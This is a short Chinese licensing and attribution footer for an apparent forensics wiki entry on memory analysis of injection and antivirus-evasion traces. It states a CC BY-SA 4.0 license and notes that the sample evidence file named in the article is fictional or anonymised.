本文为 DigiForensics 独立创作的知识条目，采用 [知识共享 署名-相同方式共享 4.0 国际](https://creativecommons.org/licenses/by-sa/4.0/deed.zh-hans) 许可协议发布。

- **署名**：引用本文时请注明「DigiForensics Wiki — 内存与专项分析 — 注入执行与免杀痕迹」
- **相同方式共享**：衍生作品须采用相同协议发布

示例：`本文内容参考自 DigiForensics Wiki《注入执行与免杀痕迹》（CC BY-SA 4.0）`

文中 `DigiForensics-mem.raw` 为示例证据文件名，指向虚构或已脱敏的检材，与真实案件无关。

---
